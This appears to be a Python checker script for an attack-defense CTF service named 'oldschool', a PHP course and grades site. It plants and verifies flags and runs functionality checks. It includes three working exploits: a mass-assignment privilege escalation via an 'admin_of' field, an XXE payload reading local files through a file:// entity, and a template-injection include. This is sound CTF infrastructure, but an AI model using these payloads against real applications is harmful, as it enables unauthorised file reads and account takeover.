import asyncio
from bs4 import BeautifulSoup
import io

from enochecker3 import (
    ChainDB,
    DependencyInjector,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_in, assert_equals

from httpx import AsyncClient, Response

from logging import LoggerAdapter

from subprocess import Popen, PIPE

import string

from typing import Any, Optional

import random

import os

import re

"""
Checker config
"""

SERVICE_PORT = 9080
checker = Enochecker("oldschool", SERVICE_PORT)


def app():
    return checker.app


"""
Utility functions
"""


random.seed(int.from_bytes(os.urandom(16), "little"))
alphabet = string.ascii_letters + string.digits


def noise(min_len: int, max_len: int):
    len = random.randint(min_len, max_len)
    return "".join(random.choice(alphabet) for _ in range(len))


def assert_status_code(
    logger: LoggerAdapter,
    r: Response,
    code: int,
    errmsg: Optional[str],
    info: Any = "",
) -> None:
    if r.status_code != code:
        logger.error(
            f"Bad http status code for "
            + f"{r.request.method} {r.request.url.path}:\n"
            + f"Info: {str(info)}\n{r.text}"
        )
        if errmsg is None:
            errmsg = f"{r.request.method} {r.request.url.path} failed"
        raise MumbleException(errmsg)


def parse_flag(text: str):
    try:
        soup = BeautifulSoup(text, "html.parser")
        flag_label = soup.find("label", string="Flag:")
        flag = flag_label.find_next_sibling().get_text(strip=True)
        return flag
    except Exception:
        raise MumbleException("No flag found")


def parse_filename(text: str):
    soup = BeautifulSoup(text, "html.parser")
    last_li = soup.find("li")
    if last_li:
        filename = last_li.text.split("\n")[1].strip()
        return filename
    else:
        raise MumbleException("No grade filename found")


def parse_filecontent(text: str):
    soup = BeautifulSoup(text, "html.parser")
    last_li = soup.find("li")
    if last_li:
        filename = last_li.text.split("\n")[3].strip()
        return filename
    else:
        raise MumbleException("No grade filecontent found")


def parse_courseid(text: str, title: str):
    soup = BeautifulSoup(text, "html.parser")
    li_tags = soup.find_all("li")

    for li in li_tags:
        if li.h3:
            cleaned_name = li.h3.text.strip().replace("\n", "")
            if title in cleaned_name:
                id_value = re.search(r"\(ID:\s*(\d+)\s*\)", cleaned_name)
                if id_value:
                    return id_value.group(1)

    raise MumbleException("No Course Id found")


def parse_is_admin(html_text: str, course_name: str, course_id: str):
    try:
        soup = BeautifulSoup(html_text, "html.parser")

        course_items = soup.find_all("div", class_="course-item")

        for course_item in course_items:
            course_title = " ".join(course_item.find("h3").text.split())
            target_title = f"{course_name} (ID: {course_id})"

            if course_title == target_title:
                admin_label = course_item.find("span", class_="label-admin")
                if admin_label:
                    return True

        return False
    except Exception:
        raise MumbleException("Could not parse admin status")


def parse_is_joined(html_text: str, course_id: str):
    try:
        soup = BeautifulSoup(html_text, "html.parser")

        course_items = soup.find_all("div", class_="course-item")

        for course_item in course_items:
            course_title = " ".join(
                " ".join(course_item.find("h3").text.split()).split()[1:]
            )
            target_title = f"(ID: {course_id})"

            if course_title == target_title:
                joined_label = course_item.find("span", class_="label-joined")
                if joined_label:
                    return True

        return False
    except Exception:
        raise MumbleException("Could not parse joined status")


def parse_random_courseid(text: str):
    try:
        soup = BeautifulSoup(text, "html.parser")
        course_ids = [
            int(input_tag["value"])
            for input_tag in soup.find_all("input", attrs={"name": "course_id"})
        ]
        return random.choice(course_ids)
    except Exception:
        raise MumbleException("No Course found")


def generate_xxe_payload(filename: str):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///service/grades/{filename}">
]>
<data>
    <course>
        <name>Malicious Course</name>
        <description>&xxe;</description>
    </course>
</data>"""


def generate_course(name: str, description: str):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<data>
    <course>
        <name>{name}</name>
        <description>{description}</description>
    </course>
</data>"""


def generate_ssti_payload(filename: str):
    return f"{{% include 'grades/{filename}' %}}"


"""
Checker functions
"""


@checker.putflag(0)
async def putflag_db(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed")

    # parse user id
    r = await client.get("/index.php?action=home")
    assert_status_code(logger, r, 200, "Get home page failed")
    id_match = re.search(r'href="index\.php\?action=profile&id=(\d+)"', r.text)
    user_id = id_match.group(1)

    # update profile
    name, flag = noise(5, 16), task.flag
    data = {"username": username, "name": name, "flag": flag}
    r = await client.post("/index.php?action=profile", data=data)
    assert_status_code(logger, r, 200, "Update Profile failed")

    # create new course and become course admin
    title = noise(10, 12)
    files = {
        "title": (None, title),
        "course_data": (
            "newcourse.xml",
            io.BytesIO(generate_course(noise(3, 5), noise(10, 20)).encode()),
            "text/xml",
        ),
    }
    r = await client.post("/index.php?action=courses", files=files)
    assert_status_code(logger, r, 201, "Upload Course failed", info=data)

    # parse course id
    rcrs = await client.get("/index.php?action=courses")
    assert_status_code(logger, rcrs, 200, "Get courses failed")
    course_id = parse_courseid(rcrs.text, title)

    await db.set("info", (username, password, user_id, title, course_id))

    return f"User {username} Id {user_id} Course {course_id}"  # This is attack info


@checker.getflag(0)
async def getflag_db(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    try:
        username, password, user_id, title, course_id = await db.get("info")
    except KeyError:
        raise MumbleException("database entry missing")

    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=login", data=data)
    assert_status_code(logger, r, 302, "Login failed")

    r = await client.get(f"/index.php?action=profile&id={user_id}")
    assert_status_code(logger, r, 200, "Access profile failed")
    flag = parse_flag(r.text)

    assert_in(task.flag, flag, "Flag missing")

    # check if user is still course admin
    r = await client.get("/index.php?action=courses")
    assert_status_code(logger, r, 200, "Get courses failed")
    is_admin = parse_is_admin(r.text, title, course_id)
    if not is_admin:
        raise MumbleException("User is not course admin")


@checker.putflag(1)
async def putflag_file(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed")

    # create the grade file
    file_obj = io.BytesIO(task.flag.encode())

    # post grade
    r = await client.post("/index.php?action=grades", files={"grades": file_obj})
    assert_status_code(logger, r, 201, "Upload Grade failed")
    filename = parse_filename(r.text)
    if not filename:
        raise MumbleException("Filename missing")

    await db.set("info", (username, password))

    return f"User {username} Uploaded Grade {filename}"  # This is attack info


@checker.getflag(1)
async def getflag_file(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    try:
        username, password = await db.get("info")
    except KeyError:
        raise MumbleException("database entry missing")

    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=login", data=data)
    assert_status_code(logger, r, 302, "Login failed")

    r = await client.get(f"/index.php?action=grades")
    assert_status_code(logger, r, 200, "Access grades failed")
    flag = parse_filecontent(r.text)

    assert_in(task.flag, flag, "Flag missing")


@checker.exploit(0)
async def exploit_mass_assign(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> Optional[str]:
    print(task.attack_info)
    assert_equals(type(task.attack_info), str, "attack info missing")

    assert_equals(len(task.attack_info.split()), 6)

    # Attack info is in the form of "User {username} Id {user_id} Course {course_id}"
    _, _, _, flaguser_id, _, flagcourse_id = task.attack_info.split()

    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": "exploiter0_" + username, "password": "password"}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed")

    # exploit mass assignment in update profile
    data = {"username": "exploiter_" + username, "admin_of": flagcourse_id}
    r = await client.post("/index.php?action=profile", data=data)
    assert_status_code(
        logger, r, 200, "Mass assignment vuln in update Profile failed", info=data
    )

    # get flag
    r = await client.get(f"/index.php?action=profile&id={flaguser_id}")
    assert_status_code(logger, r, 200, "Flaguser profile missing", info=data)
    flag = searcher.search_flag(r.text)
    if flag is not None:
        return flag


@checker.exploit(1)
async def exploit_xxe(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> Optional[str]:
    assert_equals(type(task.attack_info), str, "attack info missing")

    assert_equals(len(task.attack_info.split()), 5)

    # Attack info is in the form of "User {username} Uploaded Grade {filename}"
    _, _, _, _, filename = task.attack_info.split()

    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": "exploiter1_" + username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed", info=data)

    # exploit xxe in course upload
    files = {
        "title": (None, "Malicious Course"),
        "course_data": (
            "exploit4.xml",
            io.BytesIO(generate_xxe_payload(filename).encode()),
            "text/xml",
        ),
        "is_private": (None, "on"),
    }
    r = await client.post("/index.php?action=courses", files=files)
    assert_status_code(logger, r, 201, "Upload Course failed", info=data)

    # get flag
    r = await client.get(f"/index.php?action=courses")
    assert_status_code(logger, r, 200, "Courses Missing", info=data)
    flag = searcher.search_flag(r.text)
    if flag is not None:
        return flag


@checker.exploit(2)
async def exploit_ssti(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> Optional[str]:
    assert_equals(type(task.attack_info), str, "attack info missing")

    assert_equals(len(task.attack_info.split()), 5)

    # Attack info: "User {username} Uploaded Grade {filename}"
    _, _, _, _, filename = task.attack_info.split()

    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": "exploiter2_" + username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed", info=data)

    # exploit ssti in update profile
    data = {"about_me": generate_ssti_payload(filename)}
    r = await client.post("/index.php?action=profile", data=data)
    assert_status_code(
        logger, r, 200, "Update about_me in update Profile failed", info=data
    )

    # get flag
    r = await client.get(f"/index.php?action=profile")
    assert_status_code(logger, r, 200, "Flaguser profile missing", info=data)
    flag = searcher.search_flag(r.text)
    if flag is not None:
        return flag


"""
Checker functions - Getnoise, Putnoise, Havoc
"""


@checker.putnoise(0)
async def putnoise_db(
    task: PutnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed")

    # parse user id
    r = await client.get("/index.php?action=home")
    assert_status_code(logger, r, 200, "Get home page failed")
    id_match = re.search(r'href="index\.php\?action=profile&id=(\d+)"', r.text)
    user_id = id_match.group(1)

    # update profile
    name, flag = noise(5, 16), noise(10, 20)
    data = {"username": username, "name": name, "flag": flag}
    r = await client.post("/index.php?action=profile", data=data)
    assert_status_code(logger, r, 200, "Update Profile failed")

    # create new course and become course admin
    title = noise(10, 12)
    files = {
        "title": (None, title),
        "course_data": (
            "newcourse.xml",
            io.BytesIO(generate_course(noise(3, 5), noise(10, 20)).encode()),
            "text/xml",
        ),
    }
    r = await client.post("/index.php?action=courses", files=files)
    assert_status_code(logger, r, 201, "Upload Course failed", info=data)

    # parse course id
    rcrs = await client.get("/index.php?action=courses")
    assert_status_code(logger, rcrs, 200, "Get courses failed")
    course_id = parse_courseid(rcrs.text, title)

    await db.set("info", (username, password, user_id, title, course_id, flag))


@checker.getnoise(0)
async def getnoise_db(
    task: GetnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    try:
        username, password, user_id, title, course_id, flag = await db.get("info")
    except KeyError:
        raise MumbleException("database entry missing")

    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=login", data=data)
    assert_status_code(logger, r, 302, "Login failed")

    r = await client.get(f"/index.php?action=profile&id={user_id}")
    assert_status_code(logger, r, 200, "Access profile failed")
    flag_parsed = parse_flag(r.text)

    # check if noise is still in profile
    assert_in(flag, flag_parsed, "Flag in Profile missing")

    # check if user is still course admin
    r = await client.get("/index.php?action=courses")
    assert_status_code(logger, r, 200, "Get courses failed")
    is_admin = parse_is_admin(r.text, title, course_id)
    if not is_admin:
        raise MumbleException("User is not course admin")


@checker.putnoise(1)
async def putnoise_file(
    task: PutnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed")

    # create the grade file
    content = noise(10, 20)
    file_obj = io.BytesIO(content.encode())

    # post grade
    r = await client.post("/index.php?action=grades", files={"grades": file_obj})
    assert_status_code(logger, r, 201, "Upload Grade failed")
    filename = parse_filename(r.text)
    if not filename:
        raise MumbleException("Filename missing")

    await db.set("info", (username, password, content))


@checker.getnoise(1)
async def getnoise_file(
    task: GetnoiseCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    try:
        username, password, content = await db.get("info")
    except KeyError:
        raise MumbleException("database entry missing")

    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=login", data=data)
    assert_status_code(logger, r, 302, "Login failed")

    r = await client.get(f"/index.php?action=grades")
    assert_status_code(logger, r, 200, "Access grades failed")

    assert_in(content, r.text, "File content missing")


@checker.havoc(0)
async def havoc_registerlogoutlogin(
    task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient
):
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed")

    r = await client.get("/index.php?action=logout")
    assert_status_code(logger, r, 302, "Logout failed")

    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=login", data=data)
    assert_status_code(logger, r, 302, "Login failed")


@checker.havoc(1)
async def havoc_joincourse(
    task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient
):
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed")

    r = await client.get("/index.php?action=courses")
    assert_status_code(logger, r, 200, "Get courses failed")
    course_id = parse_random_courseid(r.text)

    data = {"course_id": course_id}
    r = await client.post("/index.php?action=join_course", data=data)
    assert_status_code(logger, r, 302, "Join course failed")

    r = await client.get("/index.php?action=courses")
    assert_status_code(logger, r, 200, "Get courses failed")
    is_joined = parse_is_joined(r.text, course_id)
    if not is_joined:
        raise MumbleException("User is not joined")


@checker.havoc(2)
async def havoc_aboutus(
    task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient
):
    r = await client.get("/index.php?action=about_us")
    assert_status_code(logger, r, 200, "Access about us failed")


@checker.havoc(3)
async def havoc_aboutmemarkdown(
    task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient
):
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed")

    r = await client.get("/index.php?action=profile")
    assert_status_code(logger, r, 200, "Access profile failed")

    title, p, code = noise(10, 20), noise(10, 20), noise(10, 20)

    test_markdown = f"""
## {title}
{p}
```
{code}
```
"""
    title_rendered = f"<h2>{title}</h2>"
    p_rendered = f"<p>{p}</p>"
    code_rendered = f"<pre><code>{code}</code></pre>"
    data = {"about_me": test_markdown}
    r = await client.post("/index.php?action=profile", data=data)
    assert_status_code(logger, r, 200, "Update profile failed")

    if not (
        title_rendered in r.text and p_rendered in r.text and code_rendered in r.text
    ):
        raise MumbleException("Markdown not rendered correctly")


if __name__ == "__main__":
    checker.run()
